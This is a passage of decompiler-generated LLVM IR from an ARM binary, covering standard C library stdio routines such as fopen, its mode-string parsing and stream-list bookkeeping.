dec_label_pc_1591c:                               ; preds = %dec_label_pc_15914
  %v0_1591c = load i32, i32* @r5, align 4
  %v1_1591c = add i32 %v0_1591c, 56
  store i32 %v1_1591c, i32* %r0.global-to-local, align 4
  %v0_15920 = load i32, i32* %r1.global-to-local, align 4
  %v1_15920 = add i32 %v0_15920, 129
  store i32 %v1_15920, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15934

dec_label_pc_15934:                               ; preds = %dec_label_pc_158c0, %dec_label_pc_158a8, %dec_label_pc_1591c, %dec_label_pc_15914
  %v0_15934 = load i32, i32* @r5, align 4
  %v1_15934 = inttoptr i32 %v0_15934 to i16*
  %v2_15934 = load i16, i16* %v1_15934, align 2
  %v3_15934 = zext i16 %v2_15934 to i32
  store i32 %v3_15934, i32* %r3.global-to-local, align 4
  %v1_15938 = and i32 %v3_15934, 16384
  %v2_15938 = icmp eq i32 %v1_15938, 0
  br i1 %v2_15938, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15934
  %v2_1593c = add i32 %v0_15934, 8
  %v3_1593c = inttoptr i32 %v2_1593c to i32*
  %v4_1593c = load i32, i32* %v3_1593c, align 4
  store i32 %v4_1593c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15934, %bb48
  %v1_15940 = xor i1 %v2_15938, true
  call void @__pseudo_cond_branch(i1 %v1_15940, i32 ptrtoint (i32* @global_var_12d8c.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15948 = load i32, i32* @r8, align 4
  %v2_15948 = add i32 %v0_15948, 160
  %v3_15948 = inttoptr i32 %v2_15948 to i32*
  %v4_15948 = load i32, i32* %v3_15948, align 4
  store i32 %v4_15948, i32* @r5, align 4
  %v1_1594c = add i32 %v4_15948, 8
  %v2_1594c = inttoptr i32 %v1_1594c to i32*
  %v3_1594c = load i32, i32* %v2_1594c, align 4
  store i32 %v3_1594c, i32* %r3.global-to-local, align 4
  %v1_15950 = load i32, i32* %sl.global-to-local, align 4
  %v3_15950 = icmp uge i32 %v3_1594c, %v1_15950
  store i1 %v3_15950, i1* %cpsr_c.global-to-local, align 1
  %v9_15950 = icmp eq i32 %v3_1594c, %v1_15950
  br i1 %v9_15950, label %dec_label_pc_15998, label %dec_label_pc_15958

dec_label_pc_15958:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15948, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1596475 = inttoptr i32 %v4_15948 to i32*
  %v2_1596476 = load i32, i32* %v1_1596475, align 4
  store i32 %v2_1596476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1596878 = icmp eq i32 %v2_1596476, 0
  br i1 %v9_1596878, label %dec_label_pc_15970, label %dec_label_pc_15988

dec_label_pc_15970:                               ; preds = %dec_label_pc_15958, %dec_label_pc_15970.dec_label_pc_15964_crit_edge
  %v0_1597079 = phi i32 [ %v1_15968.pre, %dec_label_pc_15970.dec_label_pc_15964_crit_edge ], [ 0, %dec_label_pc_15958 ]
  store i32 %v0_1597079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15980 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15980, label %dec_label_pc_15984, label %dec_label_pc_15970.dec_label_pc_15964_crit_edge

dec_label_pc_15970.dec_label_pc_15964_crit_edge:  ; preds = %dec_label_pc_15970
  %v0_15964.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15968.pre = load i32, i32* @r4, align 4
  %v1_15964 = inttoptr i32 %v0_15964.pre to i32*
  %v2_15964 = load i32, i32* %v1_15964, align 4
  store i32 %v2_15964, i32* %r3.global-to-local, align 4
  %v3_15968 = icmp uge i32 %v2_15964, %v1_15968.pre
  store i1 %v3_15968, i1* %cpsr_c.global-to-local, align 1
  %v9_15968 = icmp eq i32 %v2_15964, %v1_15968.pre
  br i1 %v9_15968, label %dec_label_pc_15970, label %dec_label_pc_15988

dec_label_pc_15984:                               ; preds = %dec_label_pc_15970
  %v0_15984 = load i32, i32* @r4, align 4
  store i32 %v0_15984, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15988

dec_label_pc_15988:                               ; preds = %dec_label_pc_15958, %dec_label_pc_15970.dec_label_pc_15964_crit_edge, %dec_label_pc_15984
  %v0_15988 = phi i32 [ %v0_15984, %dec_label_pc_15984 ], [ %v2_1596476, %dec_label_pc_15958 ], [ %v2_15964, %dec_label_pc_15970.dec_label_pc_15964_crit_edge ]
  %v1_15988 = phi i32 [ %v0_15984, %dec_label_pc_15984 ], [ 0, %dec_label_pc_15958 ], [ %v1_15968.pre, %dec_label_pc_15970.dec_label_pc_15964_crit_edge ]
  %v3_15988 = icmp uge i32 %v0_15988, %v1_15988
  store i1 %v3_15988, i1* %cpsr_c.global-to-local, align 1
  %v9_15988 = icmp eq i32 %v0_15988, %v1_15988
  br i1 %v9_15988, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_15988
  %v1_1598c = load i32, i32* @r5, align 4
  store i32 %v1_1598c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_15988, %bb50
  %v1_15990 = xor i1 %v9_15988, true
  call void @__pseudo_cond_branch(i1 %v1_15990, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_15994 = load i32, i32* %sl.global-to-local, align 4
  %v1_15994 = load i32, i32* @r5, align 4
  %v2_15994 = add i32 %v1_15994, 8
  %v3_15994 = inttoptr i32 %v2_15994 to i32*
  store i32 %v0_15994, i32* %v3_15994, align 4
  %v0_1599c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15998

dec_label_pc_15998:                               ; preds = %bb49, %bb51
  %v0_1599c = phi i32 [ %v0_15948, %bb49 ], [ %v0_1599c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1599c = add i32 %v0_1599c, 80
  %v3_1599c = inttoptr i32 %v2_1599c to i32*
  %v4_1599c = load i32, i32* %v3_1599c, align 4
  store i32 %v4_1599c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_159a4 = add i32 %v0_1599c, 160
  %v3_159a4 = inttoptr i32 %v2_159a4 to i32*
  %v4_159a4 = load i32, i32* %v3_159a4, align 4
  store i32 %v4_159a4, i32* %r0.global-to-local, align 4
  %v1_159a8 = inttoptr i32 %v4_1599c to i32*
  %v2_159a8 = load i32, i32* %v1_159a8, align 4
  store i32 %v2_159a8, i32* %r3.global-to-local, align 4
  %v1_159ac = add i32 %v4_159a4, 4
  %v2_159ac = inttoptr i32 %v1_159ac to i32*
  %v3_159ac = load i32, i32* %v2_159ac, align 4
  store i32 %v3_159ac, i32* %r1.global-to-local, align 4
  %v1_159b0 = add i32 %v2_159a8, 1
  store i32 %v1_159b0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_159b4 = icmp eq i32 %v3_159ac, 0
  store i32 %v1_159b0, i32* %v1_159a8, align 4
  br i1 %v2_159b4, label %dec_label_pc_159c0, label %dec_label_pc_15a20

dec_label_pc_159c0:                               ; preds = %dec_label_pc_15998
  %v0_159c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_159c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_159c0 = add i32 %v1_159c0, 8
  %v3_159c0 = inttoptr i32 %v2_159c0 to i32*
  store i32 %v0_159c0, i32* %v3_159c0, align 4
  %v0_159c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_159c4, i32* @r5, align 4
  br label %dec_label_pc_159c8

dec_label_pc_159c8:                               ; preds = %dec_label_pc_159f8.dec_label_pc_159c8_crit_edge, %dec_label_pc_159c0
  %v0_159c8 = phi i32 [ %v0_159c8.pre, %dec_label_pc_159f8.dec_label_pc_159c8_crit_edge ], [ %v0_159c4, %dec_label_pc_159c0 ]
  %v1_159c8 = inttoptr i32 %v0_159c8 to i32*
  %v2_159c8 = load i32, i32* %v1_159c8, align 4
  store i32 %v2_159c8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_159c8, i32* %r2.global-to-local, align 4
  %v2_159d464 = load i32, i32* %v1_159c8, align 4
  store i32 %v2_159d464, i32* %r3.global-to-local, align 4
  %v3_159d866 = icmp uge i32 %v2_159d464, %v2_159c8
  store i1 %v3_159d866, i1* %cpsr_c.global-to-local, align 1
  %v9_159d872 = icmp eq i32 %v2_159d464, %v2_159c8
  br i1 %v9_159d872, label %dec_label_pc_159e0, label %dec_label_pc_159f8

dec_label_pc_159e0:                               ; preds = %dec_label_pc_159c8, %dec_label_pc_159e0.dec_label_pc_159d4_crit_edge
  %v0_159e073 = phi i32 [ %v1_159d8.pre, %dec_label_pc_159e0.dec_label_pc_159d4_crit_edge ], [ %v2_159c8, %dec_label_pc_159c8 ]
  store i32 %v0_159e073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_159f0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_159f0, label %dec_label_pc_159f4, label %dec_label_pc_159e0.dec_label_pc_159d4_crit_edge

dec_label_pc_159e0.dec_label_pc_159d4_crit_edge:  ; preds = %dec_label_pc_159e0
  %v0_159d4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_159d8.pre = load i32, i32* @r4, align 4
  %v1_159d4 = inttoptr i32 %v0_159d4.pre to i32*
  %v2_159d4 = load i32, i32* %v1_159d4, align 4
  store i32 %v2_159d4, i32* %r3.global-to-local, align 4
  %v3_159d8 = icmp uge i32 %v2_159d4, %v1_159d8.pre
  store i1 %v3_159d8, i1* %cpsr_c.global-to-local, align 1
  %v9_159d8 = icmp eq i32 %v2_159d4, %v1_159d8.pre
  br i1 %v9_159d8, label %dec_label_pc_159e0, label %dec_label_pc_159f8

dec_label_pc_159f4:                               ; preds = %dec_label_pc_159e0
  %v0_159f4 = load i32, i32* @r4, align 4
  store i32 %v0_159f4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_159f8

dec_label_pc_159f8:                               ; preds = %dec_label_pc_159c8, %dec_label_pc_159e0.dec_label_pc_159d4_crit_edge, %dec_label_pc_159f4
  %v0_15a00 = phi i32 [ %v0_159f4, %dec_label_pc_159f4 ], [ %v2_159d464, %dec_label_pc_159c8 ], [ %v2_159d4, %dec_label_pc_159e0.dec_label_pc_159d4_crit_edge ]
  %v1_159f8 = phi i32 [ %v0_159f4, %dec_label_pc_159f4 ], [ %v2_159c8, %dec_label_pc_159c8 ], [ %v1_159d8.pre, %dec_label_pc_159e0.dec_label_pc_159d4_crit_edge ]
  %v3_159f8 = icmp uge i32 %v0_15a00, %v1_159f8
  store i1 %v3_159f8, i1* %cpsr_c.global-to-local, align 1
  %v9_159f8 = icmp eq i32 %v0_15a00, %v1_159f8
  br i1 %v9_159f8, label %dec_label_pc_15a00, label %dec_label_pc_159f8.dec_label_pc_159c8_crit_edge

dec_label_pc_159f8.dec_label_pc_159c8_crit_edge:  ; preds = %dec_label_pc_159f8
  %v0_159c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_159c8

dec_label_pc_15a00:                               ; preds = %dec_label_pc_159f8
  %v2_15a00 = icmp ne i32 %v1_159f8, 0
  store i1 %v2_15a00, i1* %cpsr_c.global-to-local, align 1
  %v7_15a04 = icmp slt i32 %v1_159f8, 2
  br i1 %v7_15a04, label %dec_label_pc_15a20, label %dec_label_pc_15a08

dec_label_pc_15a08:                               ; preds = %dec_label_pc_15a00
  %v0_15a08 = load i32, i32* @r5, align 4
  store i32 %v0_15a08, i32* %r0.global-to-local, align 4
  %v0_15a0c = load i32, i32* %r1.global-to-local, align 4
  %v1_15a0c = add i32 %v0_15a0c, 129
  store i32 %v1_15a0c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15a20

dec_label_pc_15a20:                               ; preds = %dec_label_pc_15998, %dec_label_pc_15a08, %dec_label_pc_15a00
  %v0_15a20 = call i32 @_stdio_openlist_dec_use()
  %v0_15a24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_15a24, i32* %r0.global-to-local, align 4
  %v2_15a2c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_15a2c, i32* @r4, align 4
  store i32 %v6_15714, i32* @r5, align 4
  store i32 %v9_15714, i32* @r6, align 4
  store i32 %v12_15714, i32* @r7, align 4
  ret i32 %v0_15a24

; uselistorder directives
  uselistorder i32 %v0_159f4, { 1, 0, 2 }
  uselistorder i32 %v1_159d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_159c8, { 1, 0 }
  uselistorder i32 %v0_1599c, { 1, 0 }
  uselistorder i32 %v0_15984, { 1, 0, 2 }
  uselistorder i32 %v1_15968.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15950, { 1, 0 }
  uselistorder i32 %v0_15908, { 1, 0, 2 }
  uselistorder i32 %v1_158ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1587c, { 1, 0, 2 }
  uselistorder i32 %v1_15860.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15850, { 1, 0 }
  uselistorder i32 %v0_1580c, { 1, 0, 2 }
  uselistorder i32 %v1_157f0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_157d0, { 1, 0 }
  uselistorder i32 %v1_1575c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 43, 6, 7, 8, 9, 10, 12, 11, 45, 13, 16, 14, 15, 17, 19, 18, 46, 20, 21, 22, 23, 24, 26, 25, 44, 27, 28, 29, 30, 32, 31, 0, 33, 34, 35, 36, 37, 38, 39, 41, 40, 1, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 7, 6, 3, 8, 9, 10, 32, 33, 11, 12, 13, 14, 34, 35, 15, 16, 17, 18, 20, 19, 2, 21, 22, 24, 23, 0, 25, 26, 27, 29, 28, 1, 30, 31 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 28, 27, 26, 32, 25, 31, 30, 3, 2, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder label %dec_label_pc_15a20, { 1, 2, 0 }
  uselistorder label %dec_label_pc_159f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_159e0, { 1, 0 }
  uselistorder label %dec_label_pc_15998, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_15988, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15970, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15934, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1590c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_158f4, { 1, 0 }
  uselistorder label %dec_label_pc_158a8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15880, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15868, { 1, 0 }
  uselistorder label %dec_label_pc_15820, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_15810, { 2, 1, 0 }
  uselistorder label %dec_label_pc_157f8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15798, { 1, 0 }
  uselistorder label %dec_label_pc_1578c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1577c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15764, { 1, 0 }
}

define i32 @function_15a38(i32 %arg1) local_unnamed_addr {
dec_label_pc_15a38:
  %v0_15a38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15a38, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15a38
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15a38, %bb
  %v10_15a40 = phi i32 [ %arg1, %dec_label_pc_15a38 ], [ 0, %bb ]
  ret i32 %v10_15a40

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15a54 = call i32 @_stdio_fopen()
  ret i32 %v0_15a54
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15a64 = load i32, i32* @r4, align 4
  store i32 %v3_15a64, i32* %stack_var_-24, align 4
  %v6_15a64 = load i32, i32* @r5, align 4
  %v9_15a64 = load i32, i32* @r6, align 4
  %v12_15a64 = load i32, i32* @r7, align 4
  %v15_15a64 = load i32, i32* @r8, align 4
  %v0_15a68 = load i32, i32* @r1, align 4
  %v1_15a68 = inttoptr i32 %v0_15a68 to i8*
  %v2_15a68 = load i8, i8* %v1_15a68, align 1
  %v2_15a70 = icmp ugt i8 %v2_15a68, 113
  store i1 %v2_15a70, i1* %cpsr_c.global-to-local, align 1
  %v7_15a70 = icmp eq i8 %v2_15a68, 114
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* @r8, align 4
  %v0_15a7c = load i32, i32* @r0, align 4
  store i32 %v0_15a7c, i32* @r7, align 4
  %v0_15a80 = load i32, i32* @r2, align 4
  store i32 %v0_15a80, i32* @r5, align 4
  %v0_15a84 = load i32, i32* @r3, align 4
  store i32 %v0_15a84, i32* @r6, align 4
  br i1 %v7_15a70, label %dec_label_pc_15ad8, label %dec_label_pc_15a8c

dec_label_pc_15a8c:                               ; preds = %entry
  %v2_15a8c = icmp ugt i8 %v2_15a68, 118
  store i1 %v2_15a8c, i1* %cpsr_c.global-to-local, align 1
  %v7_15a8c = icmp eq i8 %v2_15a68, 119
  br i1 %v7_15a8c, label %bb, label %dec_label_pc_15a98

bb:                                               ; preds = %dec_label_pc_15a8c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15a98:                               ; preds = %dec_label_pc_15a8c
  %v2_15a98 = icmp ugt i8 %v2_15a68, 96
  store i1 %v2_15a98, i1* %cpsr_c.global-to-local, align 1
  %v7_15a98 = icmp eq i8 %v2_15a68, 97
  br i1 %v7_15a98, label %bb49, label %dec_label_pc_15aa4

bb49:                                             ; preds = %dec_label_pc_15a98
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15aa4:                               ; preds = %dec_label_pc_15a98, %dec_label_pc_15b74, %dec_label_pc_15b48
  store i32 49044, i32* %r2.global-to-local, align 4
  %v0_15aa8 = call i32 @__aeabi_read_tp()
  store i32 %v0_15aa8, i32* %r0.global-to-local, align 4
  %v3_15aac = load i16, i16* @global_var_21a48.352, align 2
  %v4_15aac = sext i16 %v3_15aac to i32
  store i32 %v4_15aac, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15ab4 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ab4 = icmp eq i32 %v0_15ab4, 0
  %v3_15ab8 = add i32 %v4_15aac, %v0_15aa8
  %v4_15ab8 = inttoptr i32 %v3_15ab8 to i32*
  store i32 22, i32* %v4_15ab8, align 4
  br i1 %v2_15ab4, label %dec_label_pc_15e7c, label %dec_label_pc_15ac0

dec_label_pc_15ac0:                               ; preds = %dec_label_pc_15b98._crit_edge, %dec_label_pc_15aa4
  %v0_15ac0 = load i32, i32* @r5, align 4
  %v1_15ac0 = inttoptr i32 %v0_15ac0 to i16*
  %v2_15ac0 = load i16, i16* %v1_15ac0, align 2
  %v3_15ac0 = zext i16 %v2_15ac0 to i32
  store i32 %v3_15ac0, i32* %r3.global-to-local, align 4
  %v1_15ac4 = and i32 %v3_15ac0, 8192
  %v2_15ac4 = icmp eq i32 %v1_15ac4, 0
  br i1 %v2_15ac4, label %dec_label_pc_15e7c, label %dec_label_pc_15acc

dec_label_pc_15acc:                               ; preds = %dec_label_pc_15ac0
  store i32 %v0_15ac0, i32* @r0, align 4
  %v0_15ad0 = call i32 @free()
  store i32 %v0_15ad0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e7c

dec_label_pc_15ad8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %bb, %bb49, %dec_label_pc_15ad8
  %v1_15af4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_15ad8 ]
  %v1_15adc = add i32 %v0_15a68, 1
  %v2_15adc = inttoptr i32 %v1_15adc to i8*
  %v3_15adc = load i8, i8* %v2_15adc, align 1
  %v2_15ae0 = icmp ugt i8 %v3_15adc, 97
  store i1 %v2_15ae0, i1* %cpsr_c.global-to-local, align 1
  %v7_15ae0 = icmp eq i8 %v3_15adc, 98
  %v1_15adc.v0_15a68 = select i1 %v7_15ae0, i32 %v1_15adc, i32 %v0_15a68
  store i32 %v1_15adc.v0_15a68, i32* %r3.global-to-local, align 4
  %v1_15aec = add i32 %v1_15adc.v0_15a68, 1
  %v2_15aec = inttoptr i32 %v1_15aec to i8*
  %v3_15aec = load i8, i8* %v2_15aec, align 1
  %v4_15aec = zext i8 %v3_15aec to i32
  store i32 %v4_15aec, i32* @r3, align 4
  %v2_15af0 = icmp ugt i8 %v3_15aec, 42
  store i1 %v2_15af0, i1* %cpsr_c.global-to-local, align 1
  %v7_15af0 = icmp eq i8 %v3_15aec, 43
  br i1 %v7_15af0, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_15adc
  store i32 %v1_15af4, i32* @r3, align 4
  %v2_15af8 = add nuw nsw i32 %v1_15af4, 1
  store i32 %v2_15af8, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15adc, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15afc = icmp eq i32 %v0_15a80, 0
  br i1 %v2_15afc, label %dec_label_pc_15b04, label %dec_label_pc_15b40

dec_label_pc_15b04:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_15b08 = call i32 @malloc()
  store i32 %v0_15b08, i32* %r0.global-to-local, align 4
  store i32 %v0_15b08, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_15b0c = icmp eq i32 %v0_15b08, 0
  br i1 %v3_15b0c, label %dec_label_pc_15e80, label %dec_label_pc_15b14

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15b04
  %v0_15b18 = load i32, i32* @r8, align 4
  %v2_15b18 = add i32 %v0_15b18, -33136
  store i32 %v2_15b18, i32* %r3.global-to-local, align 4
  %v1_15b1c = inttoptr i32 %v2_15b18 to i32*
  %v2_15b1c = load i32, i32* %v1_15b1c, align 4
  store i32 %v2_15b1c, i32* %r0.global-to-local, align 4
  %v3_15b1c = add i32 %v0_15b18, -33132
  %v4_15b1c = inttoptr i32 %v3_15b1c to i32*
  %v5_15b1c = load i32, i32* %v4_15b1c, align 4
  store i32 %v5_15b1c, i32* @r1, align 4
  %v6_15b1c = add i32 %v0_15b18, -33128
  %v7_15b1c = inttoptr i32 %v6_15b1c to i32*
  %v8_15b1c = load i32, i32* %v7_15b1c, align 4
  store i32 %v8_15b1c, i32* %r2.global-to-local, align 4
  %v2_15b28 = add i32 %v0_15b08, 8
  %v3_15b28 = inttoptr i32 %v2_15b28 to i32*
  store i32 0, i32* %v3_15b28, align 4
  %v2_15b30 = load i32, i32* @r5, align 4
  %v3_15b30 = inttoptr i32 %v2_15b30 to i16*
  store i16 8192, i16* %v3_15b30, align 2
  %v2_15b34 = load i32, i32* %r0.global-to-local, align 4
  %v0_15b38 = load i32, i32* @r5, align 4
  %v1_15b38 = add i32 %v0_15b38, 56
  store i32 %v1_15b38, i32* @r3, align 4
  %v1_15b3c = inttoptr i32 %v1_15b38 to i32*
  store i32 %v2_15b34, i32* %v1_15b3c, align 4
  %v3_15b3c = add i32 %v0_15b38, 60
  %v4_15b3c = inttoptr i32 %v3_15b3c to i32*
  %v5_15b3c = load i32, i32* @r1, align 4
  store i32 %v5_15b3c, i32* %v4_15b3c, align 4
  %v6_15b3c = add i32 %v0_15b38, 64
  %v7_15b3c = inttoptr i32 %v6_15b3c to i32*
  %v8_15b3c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15b3c, i32* %v7_15b3c, align 4
  %v0_15b40.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15b40

dec_label_pc_15b40:                               ; preds = %.thread3, %dec_label_pc_15b14
  %v0_15b98 = phi i32 [ %v0_15a84, %.thread3 ], [ %v0_15b40.pre, %dec_label_pc_15b14 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15b40 = icmp slt i32 %v0_15b98, 0
  br i1 %v1_15b40, label %dec_label_pc_15b98, label %dec_label_pc_15b48

dec_label_pc_15b48:                               ; preds = %dec_label_pc_15b40
  %v0_15b4c = load i32, i32* @r4, align 4
  %v2_15b4c = and i32 %v0_15b4c, 131075
  %v1_15b50 = add nuw nsw i32 %v2_15b4c, 1
  store i32 %v1_15b50, i32* %r2.global-to-local, align 4
  %v0_15b54 = load i32, i32* @r7, align 4
  %v1_15b54 = add i32 %v0_15b54, 1
  %v2_15b58 = and i32 %v1_15b54, %v1_15b50
  store i32 %v2_15b58, i32* %r3.global-to-local, align 4
  %v3_15b5c = icmp uge i32 %v2_15b58, %v1_15b50
  store i1 %v3_15b5c, i1* %cpsr_c.global-to-local, align 1
  %v9_15b5c = icmp eq i32 %v2_15b58, %v1_15b50
  %v1_15b60 = load i32, i32* @r5, align 4
  %v2_15b60 = add i32 %v1_15b60, 4
  %v3_15b60 = inttoptr i32 %v2_15b60 to i32*
  store i32 %v0_15b98, i32* %v3_15b60, align 4
  br i1 %v9_15b5c, label %dec_label_pc_15b68, label %dec_label_pc_15aa4

dec_label_pc_15b68:                               ; preds = %dec_label_pc_15b48
  %v0_15b68 = load i32, i32* @r4, align 4
  %v1_15b68 = load i32, i32* @r7, align 4
  %v2_15b68 = sub i32 -1, %v1_15b68
  %v3_15b68 = and i32 %v0_15b68, %v2_15b68
  store i32 %v3_15b68, i32* @r3, align 4
  %v1_15b6c = and i32 %v3_15b68, 1024
  %v2_15b6c = icmp eq i32 %v1_15b6c, 0
  br i1 %v2_15b6c, label %dec_label_pc_15b8c, label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b68
  %v0_15b74 = load i32, i32* @r6, align 4
  store i32 %v0_15b74, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_15b80 = call i32 @__libc_fcntl(i32 %v0_15b74, i32 4)
  store i32 %v2_15b80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15b84 = icmp eq i32 %v2_15b80, 0
  br i1 %v2_15b84, label %dec_label_pc_15b74.dec_label_pc_15b8c_crit_edge, label %dec_label_pc_15aa4

dec_label_pc_15b74.dec_label_pc_15b8c_crit_edge:  ; preds = %dec_label_pc_15b74
  %v0_15b8c.pre = load i32, i32* @r7, align 4
  %v0_15b90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15b8c

dec_label_pc_15b8c:                               ; preds = %dec_label_pc_15b74.dec_label_pc_15b8c_crit_edge, %dec_label_pc_15b68
  %v0_15b90 = phi i32 [ %v0_15b90.pre, %dec_label_pc_15b74.dec_label_pc_15b8c_crit_edge ], [ %v0_15b68, %dec_label_pc_15b68 ]
  %v0_15b8c = phi i32 [ %v0_15b8c.pre, %dec_label_pc_15b74.dec_label_pc_15b8c_crit_edge ], [ %v1_15b68, %dec_label_pc_15b68 ]
  %v1_15b8c = and i32 %v0_15b8c, 131072
  store i32 %v1_15b8c, i32* %r3.global-to-local, align 4
  %v2_15b90 = or i32 %v1_15b8c, %v0_15b90
  store i32 %v2_15b90, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15bbc

dec_label_pc_15b98:                               ; preds = %dec_label_pc_15b40
  %v2_15b98 = icmp eq i32 %v0_15b98, -1
  store i1 %v2_15b98, i1* %cpsr_c.global-to-local, align 1
  %v7_15b98 = icmp eq i32 %v0_15b98, -1
  %v0_15ba4.pre = load i32, i32* @r4, align 4
  br i1 %v7_15b98, label %dec_label_pc_15b98._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_15b98
  %v2_15b9c = or i32 %v0_15ba4.pre, 131072
  store i32 %v2_15b9c, i32* @r4, align 4
  br label %dec_label_pc_15b98._crit_edge

dec_label_pc_15b98._crit_edge:                    ; preds = %dec_label_pc_15b98, %bb53
  %v0_15ba4 = phi i32 [ %v2_15b9c, %bb53 ], [ %v0_15ba4.pre, %dec_label_pc_15b98 ]
